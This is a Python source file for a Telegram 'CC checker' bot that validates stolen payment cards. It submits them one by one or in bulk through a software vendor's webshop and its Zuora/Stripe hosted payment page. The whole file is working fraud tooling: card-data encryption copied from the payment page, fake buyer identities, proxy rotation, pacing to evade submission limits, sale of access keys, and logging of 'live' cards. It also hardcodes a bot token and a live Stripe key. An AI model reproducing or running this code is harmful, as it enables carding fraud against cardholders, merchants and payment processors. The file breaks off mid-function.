#!/usr/bin/env python3
"""
CC Checker Telegram Bot + Web Admin Panel
Single-file version — all-in-one
Requirements: pip install pyTelegramBotAPI flask requests pycryptodome
"""

import telebot
from telebot.types import MessageEntity
import flask
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
import sqlite3
import threading
import os
import json
import time
import random
import base64
import urllib.parse
import requests
import string
import hashlib
import re
from datetime import datetime
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# ============================================================
# CONFIGURATION — EDIT THESE
# ============================================================
BOT_TOKEN       = "8766113152:AAH9dx4awq0y5t3z4BFMe07nfB6iwCebzL4"
ADMIN_ID        = 8233015284          # <-- PUT YOUR TELEGRAM CHAT ID HERE (integer)
WEB_PORT        = 5000       # Web admin panel port
WEB_SECRET      = "admin"    # Web admin panel password (change this!)
DB_FILE         = "ccbot.db"
PREMIUM_EMOJI_ID = "5352727529511723136"
# ============================================================

app = Flask(__name__)
app.secret_key = WEB_SECRET + "_flask_session"
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# DATABASE
# ============================================================

def get_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            username TEXT,
            first_name TEXT,
            has_access INTEGER DEFAULT 0,
            proxy TEXT,
            total_checked INTEGER DEFAULT 0,
            total_approved INTEGER DEFAULT 0,
            total_declined INTEGER DEFAULT 0,
            created_at TEXT DEFAULT (datetime('now')),
            last_active_at TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key TEXT UNIQUE NOT NULL,
            used_by INTEGER,
            used_at TEXT,
            created_at TEXT DEFAULT (datetime('now')),
            created_by INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS cc_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            cc TEXT NOT NULL,
            result TEXT NOT NULL,
            bin_info TEXT,
            checked_at TEXT DEFAULT (datetime('now'))
        );
    """)
    db.commit()
    db.close()

def db_get_or_create_user(telegram_id, username=None, first_name=None):
    db = get_db()
    row = db.execute("SELECT * FROM users WHERE telegram_id=?", (telegram_id,)).fetchone()
    if row:
        db.execute("UPDATE users SET last_active_at=?, username=?, first_name=? WHERE telegram_id=?",
                   (datetime.utcnow().isoformat(), username, first_name, telegram_id))
        db.commit()
        db.close()
        return dict(row)
    db.execute("INSERT INTO users (telegram_id, username, first_name, has_access) VALUES (?,?,?,0)",
               (telegram_id, username, first_name))
    db.commit()
    row = db.execute("SELECT * FROM users WHERE telegram_id=?", (telegram_id,)).fetchone()
    db.close()
    return dict(row)

def db_get_user(telegram_id):
    db = get_db()
    row = db.execute("SELECT * FROM users WHERE telegram_id=?", (telegram_id,)).fetchone()
    db.close()
    return dict(row) if row else None

def db_grant_access(telegram_id):
    db = get_db()
    db.execute("UPDATE users SET has_access=1 WHERE telegram_id=?", (telegram_id,))
    db.commit()
    db.close()

def db_revoke_access(telegram_id):
    db = get_db()
    db.execute("UPDATE users SET has_access=0 WHERE telegram_id=?", (telegram_id,))
    db.commit()
    db.close()

def db_set_proxy(telegram_id, proxy):
    db = get_db()
    db.execute("UPDATE users SET proxy=? WHERE telegram_id=?", (proxy, telegram_id))
    db.commit()
    db.close()

def db_generate_key(admin_id):
    chars = string.ascii_uppercase + string.digits
    key = "KEY-" + "".join(random.choices(chars, k=6)) + "-" + "".join(random.choices(chars, k=6))
    db = get_db()
    db.execute("INSERT INTO keys (key, created_by) VALUES (?,?)", (key, admin_id))
    db.commit()
    db.close()
    return key

def db_redeem_key(key, telegram_id):
    db = get_db()
    row = db.execute("SELECT * FROM keys WHERE key=?", (key,)).fetchone()
    if not row or row["used_by"] is not None:
        db.close()
        return False
    db.execute("UPDATE keys SET used_by=?, used_at=? WHERE key=?",
               (telegram_id, datetime.utcnow().isoformat(), key))
    db.execute("UPDATE users SET has_access=1 WHERE telegram_id=?", (telegram_id,))
    db.commit()
    db.close()
    return True

def db_save_result(user_id, cc, result, bin_info=None):
    db = get_db()
    db.execute("INSERT INTO cc_results (user_id, cc, result, bin_info) VALUES (?,?,?,?)",
               (user_id, cc, result, bin_info))
    approved = 1 if result.startswith("✅") else 0
    declined = 0 if approved else 1
    db.execute("""UPDATE users SET
        total_checked = total_checked + 1,
        total_approved = total_approved + ?,
        total_declined = total_declined + ?,
        last_active_at = ?
        WHERE telegram_id=?""",
               (approved, declined, datetime.utcnow().isoformat(), user_id))
    db.commit()
    db.close()

def db_get_all_users():
    db = get_db()
    rows = db.execute("SELECT * FROM users ORDER BY last_active_at DESC").fetchall()
    db.close()
    return [dict(r) for r in rows]

def db_get_approved_results(limit=100):
    db = get_db()
    rows = db.execute("SELECT * FROM cc_results WHERE result LIKE '✅%' ORDER BY checked_at DESC LIMIT ?", (limit,)).fetchall()
    db.close()
    return [dict(r) for r in rows]

def db_get_recent_results(limit=50):
    db = get_db()
    rows = db.execute("SELECT * FROM cc_results ORDER BY checked_at DESC LIMIT ?", (limit,)).fetchall()
    db.close()
    return [dict(r) for r in rows]

def db_get_user_results(user_id, limit=10):
    db = get_db()
    rows = db.execute("SELECT * FROM cc_results WHERE user_id=? ORDER BY checked_at DESC LIMIT ?",
                      (user_id, limit)).fetchall()
    db.close()
    return [dict(r) for r in rows]

def db_get_all_keys():
    db = get_db()
    rows = db.execute("SELECT * FROM keys ORDER BY created_at DESC").fetchall()
    db.close()
    return [dict(r) for r in rows]

# ============================================================
# BIN LOOKUP
# ============================================================

def lookup_bin(bin_number):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            parts = [d.get("brand",""), d.get("type",""), d.get("level",""),
                     d.get("bank",""), d.get("country_name",""), d.get("country_flag","")]
            return " | ".join(p for p in parts if p)
    except:
        pass
    return "BIN not found"

# ============================================================
# CHAOS CHARGE API
# ============================================================

def get_str(s, start, end):
    try:
        i = s.index(start) + len(start)
        j = s.index(end, i)
        return s[i:j]
    except:
        return ""

def encrypt_card_data(cc, cvv, mm, yy, ip="38.68.134.126"):
    field = f"#{ip}#{cc}#{cvv}#{mm}#{yy}"
    b64 = base64.b64encode(field.encode()).decode()
    pub_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/Pj83U19IjYxkXylsnhQ7raV/TwK6cXuPtozVkzLcPnlgYD0aA5Y19UvKHea42qtrGfDSMB24AlbfGy0Skke1xpow5UXrlHZZXO6vPKLd6hwec9ironFmv+TThxZtiH06lfdU2LJbPSFTwxfmi/s4L6VmFnCq9APRAYZf66OEetVN7bq6pOf9tmsy3b+JEsXezT7XnkVqCSztX1hrvSd4LFeQ1D/x1YESun/opXUsMFi/ATNe1OqZX9T05X3DGFtVCJpIWb2rpMY5aFdyFnoq0p1JScTdxBO4XPFNWaUXL1aCd5GTn2BrW846SgUcqLGiEEYXaCVA0+ObERwvmwdwIDAQAB
-----END PUBLIC KEY-----"""
    key = RSA.import_key(pub_key)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(b64.encode())
    return urllib.parse.quote(base64.b64encode(encrypted).decode())

def get_proxy_dict(proxy_str):
    if not proxy_str:
        return None
    if not proxy_str.startswith("http"):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

def chaos_charge(fullcc, proxy_str=None):
    try:
        parts = fullcc.split("|")
        if len(parts) != 4:
            return "❌ Format Error: use CC|MM|YY|CVV"
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy

        card_type = "Visa"
        if cc[0] == "4":   card_type = "Visa"
        elif cc[0] in "52": card_type = "MasterCard"
        elif cc[0] == "6":  card_type = "Discover"
        elif cc[0] == "3":  card_type = "AmericanExpress"

        first = random.choice(["John","Emily","Michael","Sarah","David","Jessica"])
        last  = random.choice(["Smith","Johnson","Brown","Wilson","Davis"])
        email = f"{first.lower()}{random.randint(1000,9999)}@gmail.com"

        proxies = get_proxy_dict(proxy_str)
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://www.chaos.com",
            "Referer": "https://www.chaos.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
        }

        s = requests.Session()
        if proxies:
            s.proxies.update(proxies)

        s.post("https://orders.chaos.com/api/v1/webshop/cart/product", json={
            "ratePlan": "8a129943993322c301994d2186010e74",
            "quantity": 1,
            "sourceRatePlan": "8a128c8d96add87d0196ce5104547f99",
            "migrationPathId": "849f9cc2-62cd-4811-b0d9-f65f806c812a"
        }, headers=headers, timeout=20)

        s.patch("https://orders.chaos.com/api/v1/webshop/cart",
                json={"email": email}, headers=headers, timeout=20)

        s.post("https://orders.chaos.com/api/v1/webshop/subscriptions/preview", json={
            "promoCode": "",
            "account": {"city": "sumare", "country": "BR", "zipCode": "13181000",
                        "state": "", "vatId": "", "currency": "USD"},
            "products": [{"ratePlanId": "8a129943993322c301994d2186010e74", "seats": 1}]
        }, headers=headers, timeout=20)

        r4 = s.post("https://orders.chaos.com/api/v1/webshop/payments/page-signature",
                    json={"pageId": "8a12989f87b6eec70187c1f5d5aa7860"},
                    headers=headers, timeout=20)

        token     = get_str(r4.text, 'token":"', '"')
        signature = get_str(r4.text, 'signature":"', '"')
        if not token:
            return "❌ Error: Failed to get token"

        zuora_url = (
            "https://www.zuora.com/apps/PublicHostedPageLite.do"
            "?method=requestPage&host=https%3A%2F%2Fwww.chaos.com%2Fenscape%2Ftrial"
            "&fromHostedPage=true"
            f"&signature={urllib.parse.quote(signature)}&token={token}"
            "&tenantId=6466&style=inline&id=8a12989f87b6eec70187c1f5d5aa7860"
            "&submitEnabled=true&locale=en&authorizationAmount=0"
            "&field_currency=USD&customizeErrorRequired=true&zlog_level=warn"
        )

        h2 = {k: v for k, v in headers.items() if k not in ("Content-Type", "Origin")}
        r5 = s.get(zuora_url, headers=h2, timeout=20)
        signature2 = get_str(r5.text, 'name="signature" id="signature" value="', '"')
        token2     = get_str(r5.text, 'name="token" id="token" value="', '"')

        encoded_values = encrypt_card_data(cc, cvv, mm, yy)

        raw_body = (
            f"method=submitPage&id=8a12989f87b6eec70187c1f5d5aa7860&tenantId=6466"
            f"&token={token2}&signature={urllib.parse.quote(signature2)}"
            "&paymentGateway=&field_authorizationAmount=0&field_screeningAmount="
            "&field_currency=USD"
            "&field_key=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw%2FPj83U19IjYxkXylsnhQ7raV%2FTwK6cXuPtozVkzLcPnlgYD0aA5Y19UvKHea42qtrGfDSMB24AlbfGy0Skke1xpow5UXrlHZZXO6vPKLd6hwec9ironFmv%2BTThxZtiH06lfdU2LJbPSFTwxfmi%2Fs4L6VmFnCq9APRAYZf66OEetVN7bq6pOf9tmsy3b%2BJEsXezT7XnkVqCSztX1hrvSd4LFeQ1D%2Fx1YESun%2FopXUsMFi%2FATNe1OqZX9T05X3DGFtVCJpIWb2rpMY5aFdyFnoq0p1JScTdxBO4XPFNWaUXL1aCd5GTn2BrW846SgUcqLGiEEYXaCVA0%2BObERwvmwdwIDAQAB"
            "&locale=en&field_style=inline&jsVersion=&field_submitEnabled=true"
            "&field_callbackFunctionEnabled=&field_signatureType="
            "&host=https%3A%2F%2Fwww.chaos.com%2Fenscape%2Ftrial"
            "&encrypted_fields=%23field_ipAddress%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear"
            f"&encrypted_values={encoded_values}"
            "&customizeErrorRequired=true&fromHostedPage=true&isGScriptLoaded=false"
            "&is3DSEnabled=&checkDuplicated=&captchaRequired=&captchaSiteKey="
            "&field_mitConsentAgreementSrc=&field_mitConsentAgreementRef="
            "&field_mitCredentialProfileType=&field_agreementSupportedBrands="
            "&paymentGatewayType=Stripe&paymentGatewayVersion=2&is3DS2Enabled=true"
            "&cardMandateEnabled=false&zThreeDs2TxId=&threeDs2token=&threeDs2Sig="
            "&threeDs2Ts=&threeDs2OnStep=&threeDs2GwData=&doPayment=&storePaymentMethod="
            "&documents=&xjd28s_6sk=627f82ccf6bf42c8b24bc62a5cb4391d&pmId="
            "&button_outside_force_redirect=false"
            "&browserScreenHeight=864&browserScreenWidth=1536"
            "&stripePublishableKey=pk_live_519uLHbIPXL7r2E4SO6YDZKG5dWBu3WwfcuN189EqxSl2R4sQoihAVmQQhsKcxqoIN6ieEQoxf572jDPtvLHzQcth00nlZ4oJgM"
            f"&field_creditCardType={card_type}"
            "&field_creditCardNumber=&field_creditCardExpirationMonth="
            "&field_creditCardExpirationYear=&field_cardSecurityCode="
            f"&field_creditCardHolderName={urllib.parse.quote(first + ' ' + last)}"
        )

        final_headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.zuora.com",
            "referer": zuora_url,
            "user-agent": headers["User-Agent"],
            "x-requested-with": "XMLHttpRequest",
        }

        rf = s.post("https://www.zuora.com/apps/PublicHostedPageLite.do",
                    data=raw_body, headers=final_headers, timeout=30)
        result = rf.text

        if '"AuthorizeResult":"Approved"' in result or '"success":true' in result:
            return "✅ Approved - Transaction Authorized"
        elif '"ThreeDSResult":"ChallengeRequired"' in result:
            return "✅ Approved (3DS Challenge Required)"
        elif "INSUFFICIENT_FUNDS" in result.upper():
            return "✅ Approved (Insufficient Funds)"
        elif any(x in result.upper() for x in ["INCORRECT_CVC","INVALID_CVC","SECURITY_CODE"]):
            return "✅ Approved (CCN Live - Bad CVC)"
        else:
            msg = get_str(result, 'errorMessage":"', '"')
            if not msg:
                try:
                    msg = json.loads(result).get("errorMessage","")
                except:
                    pass
            return f"❌ Declined - {msg or 'Unknown reason'}"

    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================
# HELPERS & FORMATTERS
# ============================================================

SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

def is_admin(chat_id):
    return int(chat_id) == int(ADMIN_ID)

def has_access(chat_id):
    if is_admin(chat_id):
        return True
    user = db_get_user(chat_id)
    return bool(user and user.get("has_access"))

def mask_cc(cc):
    return cc

def format_card_line(fullcc):
    return f"<code>{fullcc}</code>"

def format_bin(bin_info):
    if not bin_info or bin_info == "BIN not found":
        return "🏦 <b>Bank:</b> <i>Unknown</i>"
    parts = bin_info.split(" | ")
    lines = []
    brand = parts[0] if len(parts) > 0 else ""
    btype = parts[1] if len(parts) > 1 else ""
    level = parts[2] if len(parts) > 2 else ""
    bank  = parts[3] if len(parts) > 3 else ""
    country = parts[4] if len(parts) > 4 else ""
    flag  = parts[5] if len(parts) > 5 else ""
    if bank:    lines.append(f"🏦 <b>Bank:</b> {bank}")
    if brand or btype: lines.append(f"💎 <b>Type:</b> {' · '.join(filter(None, [brand, btype, level]))}")
    if country: lines.append(f"🌍 <b>Country:</b> {flag} {country}")
    return "\n".join(lines) if lines else "🏦 <b>Bank:</b> <i>Unknown</i>"

def approved_msg(fullcc, result, bin_info, elapsed):
    detail = result.replace("✅ Approved", "").replace("✅", "").replace("- ", "").strip() or "Transaction Authorized"
    elapsed_s = f"{elapsed:.1f}s"
    return "\n".join([
        "┌─────────────────────────┐",
        "│  ✅  <b>APPROVED</b>  ✅         │",
        "└─────────────────────────┘",
        "",
        f"💳 <b>Card:</b> {format_card_line(fullcc)}",
        format_bin(bin_info),
        f"⚡ <b>Result:</b> {detail}",
        f"⏱ <b>Time:</b> {elapsed_s}",
        "",
        "<i>✨ Card is live!</i>",
    ])

def declined_msg(fullcc, result, bin_info, elapsed):
    reason = result.replace("❌ Declined -", "").replace("❌ Declined", "").replace("❌", "").strip() or "Unknown reason"
    elapsed_s = f"{elapsed:.1f}s"
    return "\n".join([
        "┌─────────────────────────┐",
        "│  ❌  <b>DECLINED</b>  ❌         │",
        "└─────────────────────────┘",
        "",
        f"💳 <b>Card:</b> {format_card_line(fullcc)}",
        format_bin(bin_info),
        f"🚫 <b>Reason:</b> {reason}",
        f"⏱ <b>Time:</b> {elapsed_s}",
    ])

def mass_status_msg(current, total, approved, declined, card=None):
    pct = int((current / total) * 100) if total > 0 else 0
    filled = pct // 10
    bar = "█" * filled + "░" * (10 - filled)
    spinner = SPINNER[int(time.time() * 4) % len(SPINNER)]
    card_line = ""
    if card:
        card_line = f"\n🔍 Checking: <code>{card}</code>"
    return "\n".join([
        f"{spinner} <b>Mass Check in Progress</b>",
        "",
        f"[{bar}] {pct}%",
        f"📊 {current}/{total} processed",
        f"✅ Approved: <b>{approved}</b>  ❌ Declined: <b>{declined}</b>{card_line}",
    ])

def mass_done_msg(total, approved, declined, elapsed):
    rate = f"{(approved/total*100):.1f}" if total > 0 else "0.0"
    return "\n".join([
        "╔═════════════════════════╗",
        "║   🏁  <b>MASS CHECK DONE</b>  🏁  ║",
        "╚═════════════════════════╝",
        "",
        f"📦 <b>Total Checked:</b>  {total}",
        f"✅ <b>Approved:</b>       <b>{approved}</b>",
        f"❌ <b>Declined:</b>       <b>{declined}</b>",
        f"📈 <b>Hit Rate:</b>       <b>{rate}%</b>",
        f"⏱ <b>Total Time:</b>     {elapsed:.1f}s",
    ])

# ============================================================
# BOT HANDLERS
# ============================================================

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    chat_id = msg.chat.id
    username   = msg.from_user.username if msg.from_user else None
    first_name = msg.from_user.first_name if msg.from_user else "User"
    db_get_or_create_user(chat_id, username, first_name)

    status = "👑 Admin" if is_admin(chat_id) else ("✅ Active" if has_access(chat_id) else "❌ No Access")
    bot.send_message(chat_id, "\n".join([
        "╔═══════════════════════╗",
        "║  🔥 <b>CC CHECKER BOT</b> 🔥  ║",
        "╚═══════════════════════╝",
        "",
        f"👋 Welcome, <b>{first_name}</b>!",
        "",
        "📋 Use /help to see all commands",
        "🔑 Use /redeem &lt;KEY&gt; to activate",
        "",
        f"Status: {status}",
    ]), parse_mode="HTML")

@bot.message_handler(commands=["help"])
def cmd_help(msg):
    chat_id = msg.chat.id
    admin_section = ""
    if is_admin(chat_id):
        admin_section = (
            "\n\n<b>👑 Admin Commands:</b>\n"
            "/genkey — Generate an access key\n"
            "/adduser &lt;ID&gt; — Grant user access\n"
            "/removeuser &lt;ID&gt; — Revoke user access\n"
            "/users — List all users and stats\n"
            "/allusers — Full user list"
        )
    bot.send_message(chat_id,
        "🤖 <b>CC Checker Bot — Commands</b>\n\n"
        "<b>💳 CC Commands:</b>\n"
        "/cc &lt;CC|MM|YY|CVV&gt; — Check a single CC\n"
        "/mcc — Mass check (send list after command)\n"
        "/mtxt — Mass check from .txt file\n\n"
        "<b>🔧 Settings:</b>\n"
        "/proxy &lt;host:port&gt; — Set proxy\n"
        "/proxy &lt;user:pass@host:port&gt; — Set auth proxy\n"
        "/proxy off — Remove proxy\n"
        "/myproxy — View your proxy\n\n"
        "<b>🔑 Access:</b>\n"
        "/redeem &lt;KEY&gt; — Activate with a key\n\n"
        "<b>📊 Stats:</b>\n"
        "/stats — Your checking statistics\n"
        "/results — Your last 10 results\n"
        f"{admin_section}\n\n"
        "<b>Format:</b> <code>4111111111111111|01|2026|123</code>",
        parse_mode="HTML"
    )

@bot.message_handler(commands=["cc"])
def cmd_cc(msg):
    chat_id = msg.chat.id
    if not has_access(chat_id):
        bot.send_message(chat_id, "❌ No access. Use /redeem &lt;KEY&gt; to activate.", parse_mode="HTML")
        return

    parts = msg.text.split(None, 1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Usage: /cc CC|MM|YY|CVV")
        return

    fullcc = parts[1].strip()
    bin_num = fullcc.split("|")[0][:6]
    user = db_get_user(chat_id)
    proxy = user.get("proxy") if user else None

    m = bot.send_message(chat_id, "⠋ <b>Initializing check...</b>", parse_mode="HTML")

    def do_check():
        stop_spinner = threading.Event()
        frame = [0]
        start_t = time.time()

        def spinner_loop():
            while not stop_spinner.is_set():
                sp = SPINNER[frame[0] % len(SPINNER)]
                frame[0] += 1
                elapsed = time.time() - start_t
                txt = "\n".join([
                    f"{sp} <b>Checking card...</b>",
                    "",
                    f"💳 <code>{fullcc}</code>",
                    "",
                    f"⏱ Elapsed: {elapsed:.1f}s",
                    "<i>Connecting to gateway...</i>",
                ])
                try:
                    bot.edit_message_text(txt, chat_id, m.message_id, parse_mode="HTML")
                except:
                    pass
                stop_spinner.wait(0.6)

        t = threading.Thread(target=spinner_loop, daemon=True)
        t.start()

        try:
            result   = chaos_charge(fullcc, proxy)
            bin_info = lookup_bin(bin_num) if bin_num else ""
            stop_spinner.set()
            elapsed = time.time() - start_t
            db_save_result(chat_id, fullcc, result, bin_info)

            text = approved_msg(fullcc, result, bin_info, elapsed) if result.startswith("✅") \
                   else declined_msg(fullcc, result, bin_info, elapsed)
            bot.send_message(chat_id, text, parse_mode="HTML")
        except Exception as e:
            stop_spinner.set()
            bot.send_message(chat_id, f"❌ <b>Error:</b> {e}", parse_mode="HTML")

    threading.Thread(target=do_check, daemon=True).start()

@bot.message_handler(commands=["mcc"])
def cmd_mcc(msg):
    chat_id = msg.chat.id
    if not has_access(chat_id):
        bot.send_message(chat_id, "❌ No access. Use /redeem &lt;KEY&gt; to activate.", parse_mode="HTML")
        return
    bot.send_message(chat_id, "\n".join([
        "📋 <b>Mass Check Mode</b>",
        "",
        "Send your CC list, one per line:",
        "<code>CC|MM|YY|CVV</code>",
        "<code>CC|MM|YY|CVV</code>",
        "...",
    ]), parse_mode="HTML")
    bot.register_next_step_handler(msg, process_mcc_list)

def process_mcc_list(msg):
    chat_id = msg.chat.id
    lines = [l.strip() for l in (msg.text or "").split("\n") if "|" in l.strip()]
    if not lines:
        bot.send_message(chat_id, "❌ No valid CCs found.")
        return
    threading.Thread(target=run_mass_check, args=(chat_id, lines), daemon=True).start()

@bot.message_handler(commands=["mtxt"])
def cmd_mtxt(msg):
    chat_id = msg.chat.id
    if not has_access(chat_id):
        bot.send_message(chat_id, "❌ No access. Use /redeem &lt;KEY&gt; to activate.", parse_mode="HTML")
        return
    bot.send_message(chat_id, "📁 Send me a .txt file with CCs (one per line, CC|MM|YY|CVV):")
    bot.register_next_step_handler(msg, process_mtxt_file)

def process_mtxt_file(msg):
    chat_id = msg.chat.id
    if not msg.document:
        bot.send_message(chat_id, "❌ Please send a .txt file.")
        return
    doc = msg.document
    if not (doc.file_name or "").endswith(".txt") and doc.mime_type != "text/plain":
        bot.send_message(chat_id, "❌ Only .txt files are supported.")
        return

    def do_file():
        try:
            file_info = bot.get_file(doc.file_id)
            file_url  = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            r = requests.get(file_url, timeout=15)
            lines = [l.strip() for l in r.text.split("\n") if "|" in l.strip()]
            if not lines:
                bot.send_message(chat_id, "❌ No valid CCs found in file.")
                return
            run_mass_check(chat_id, lines)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error reading file: {e}")

    threading.Thread(target=do_file, daemon=True).start()

def run_mass_check(chat_id, lines):
    user  = db_get_user(chat_id)
    proxy = user.get("proxy") if user else None
    total = len(lines)
    start_all = time.time()
    approved = 0
    declined = 0

    m = bot.send_message(chat_id, mass_status_msg(0, total, 0, 0), parse_mode="HTML")

    for i, fullcc in enumerate(lines):
        bin_num = fullcc.split("|")[0][:6]
        card_start = time.time()

        # Animate status while checking this card
        stop_anim = threading.Event()
        def update_status(idx=i, cc=fullcc, ap=approved, dc=declined):
            while not stop_anim.is_set():
                try:
                    bot.edit_message_text(
                        mass_status_msg(idx + 1, total, ap, dc, cc),
                        chat_id, m.message_id, parse_mode="HTML"
                    )
                except:
                    pass
                stop_anim.wait(0.7)
        anim_t = threading.Thread(target=update_status, daemon=True)
        anim_t.start()

        try:
            result   = chaos_charge(fullcc, proxy)
            bin_info = lookup_bin(bin_num) if bin_num else ""
            stop_anim.set()
            elapsed  = time.time() - card_start
            db_save_result(chat_id, fullcc, result, bin_info)

            if result.startswith("✅"):
                approved += 1
                bot.send_message(chat_id, approved_msg(fullcc, result, bin_info, elapsed), parse_mode="HTML")
            else:
                declined += 1
                bot.send_message(chat_id, declined_msg(fullcc, result, bin_info, elapsed), parse_mode="HTML")
        except Exception as e:
            stop_anim.set()
            declined += 1
            bot.send_message(chat_id, f"❌ <b>Error</b>\n💳 <code>{fullcc}</code>\n🚫 {e}", parse_mode="HTML")

        try:
            bot.edit_message_text(
                mass_status_msg(i + 1, total, approved, declined),
                chat_id, m.message_id, parse_mode="HTML"
            )
        except:
            pass

        # 10-second cooldown between cards to avoid "Too many submissions"
        if i < total - 1:
            for s in range(10, 0, -1):
                try:
                    bot.edit_message_text(
                        mass_status_msg(i + 1, total, approved, declined) + f"\n\n⏳ <i>Next card in {s}s...</i>",
                        chat_id, m.message_id, parse_mode="HTML"
                    )
                except:
                    pass
                time.sleep(1)

    elapsed_all = time.time() - start_all
    try:
        bot.edit_message_text(
            mass_done_msg(total, approved, declined, elapsed_all),
            chat_id, m.message_id, parse_mode="HTML"
        )
    except:
        bot.send_message(chat_id, mass_done_msg(total, approved, declined, elapsed_all), parse_mode="HTML")

@bot.message_handler(commands=["proxy"])
def cmd_proxy(msg):
    chat_id = msg.chat.id
    if not has_access(chat_id):
        bot.send_message(chat_id, "❌ No access.")
        return
    parts = msg.text.split(None, 1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Usage: /proxy host:port  or  /proxy off")
        return
    val = parts[1].strip()
    if val.lower() == "off":
        db_set_proxy(chat_id, None)
        bot.send_message(chat_id, "✅ Proxy removed. Using direct connection.")
    else:
        db_set_proxy(chat_id, val)
        bot.send_message(chat_id, f"✅ Proxy set: <code>{val}</code>", parse_mode="HTML")

@bot.message_handler(commands=["myproxy"])
def cmd_myproxy(msg):
    chat_id = msg.chat.id
    user = db_get_user(chat_id)
    if not user or not user.get("proxy"):
        bot.send_message(chat_id, "📡 No proxy set. Using direct connection.\nUse /proxy host:port to set one.")
    else:
        bot.send_message(chat_id, f"📡 Your proxy: <code>{user['proxy']}</code>", parse_mode="HTML")

@bot.message_handler(commands=["redeem"])
def cmd_redeem(msg):
    chat_id = msg.chat.id
    username   = msg.from_user.username if msg.from_user else None
    first_name = msg.from_user.first_name if msg.from_user else None
    db_get_or_create_user(chat_id, username, first_name)
    parts = msg.text.split(None, 1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Usage: /redeem KEY")
        return
    key = parts[1].strip()
    if db_redeem_key(key, chat_id):
        bot.send_message(chat_id, "\n".join([
            "╔══════════════════════╗",
            "║  🎉  <b>ACCESS GRANTED</b>  🎉  ║",
            "╚══════════════════════╝",
            "",
            "✅ Key redeemed successfully!",
            "You now have full access.",
            "",
            "Use /help to see all commands.",
        ]), parse_mode="HTML")
    else:
        bot.send_message(chat_id, "❌ <b>Invalid or already used key.</b>", parse_mode="HTML")

@bot.message_handler(commands=["stats"])
def cmd_stats(msg):
    chat_id = msg.chat.id
    user = db_get_user(chat_id)
    if not user:
        bot.send_message(chat_id, "❌ User not found. Send /start first.")
        return
    rate_f = (user['total_approved'] / user['total_checked'] * 100) if user["total_checked"] > 0 else 0.0
    rate = f"{rate_f:.1f}"
    filled = round(rate_f / 10)
    bar = "█" * filled + "░" * (10 - filled)
    bot.send_message(chat_id, "\n".join([
        "📊 <b>Your Statistics</b>",
        "",
        f"👤 <b>User:</b> {user.get('first_name') or user.get('username') or chat_id}",
        f"🔐 <b>Access:</b> {'✅ Active' if user['has_access'] else '❌ No Access'}",
        f"📡 <b>Proxy:</b> {user.get('proxy') or 'None'}",
        "",
        "━━━━━━━━━━━━━━━━━━━",
        f"💳 <b>Total Checked:</b>  {user['total_checked']}",
        f"✅ <b>Approved:</b>       {user['total_approved']}",
        f"❌ <b>Declined:</b>       {user['total_declined']}",
        "━━━━━━━━━━━━━━━━━━━",
        f"📈 <b>Hit Rate:</b>  {rate}%",
        f"[{bar}]",
    ]), parse_mode="HTML")

@bot.message_handler(commands=["results"])
def cmd_results(msg):
    chat_id = msg.chat.id
    if not has_access(chat_id):
        bot.send_message(chat_id, "❌ No access.")
        return
    results = db_get_user_results(chat_id, 10)
    if not results:
        bot.send_message(chat_id, "📭 No results yet. Use /cc to check cards.")
        return
    lines = []
    for i, r in enumerate(results):
        icon = "✅" if r['result'].startswith("✅") else "❌"
        lines.append(f"{i+1}. {icon} <code>{r['cc']}</code>")
    bot.send_message(chat_id,
        "\n".join([f"📋 <b>Your Last {len(results)} Results:</b>", ""] + lines),
        parse_mode="HTML"
    )

# ============================================================
# ADMIN BOT COMMANDS
# ============================================================

@bot.message_handler(commands=["genkey"])
def cmd_genkey(msg):
    chat_id = msg.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ Admin only.")
        return
    key = db_generate_key(chat_id)
    bot.send_message(chat_id, "\n".join([
        "🔑 <b>New Access Key Generated</b>",
        "",
        f"<code>{key}</code>",
        "",
        f"Share with user → they use: /redeem {key}",
    ]), parse_mode="HTML")

@bot.message_handler(commands=["adduser"])
def cmd_adduser(msg):
    chat_id = msg.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ Admin only.")
        return
    parts = msg.text.split(None, 1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Usage: /adduser <TelegramID>")
        return
    try:
        target_id = int(parts[1].strip())
    except:
        bot.send_message(chat_id, "❌ Invalid Telegram ID.")
        return
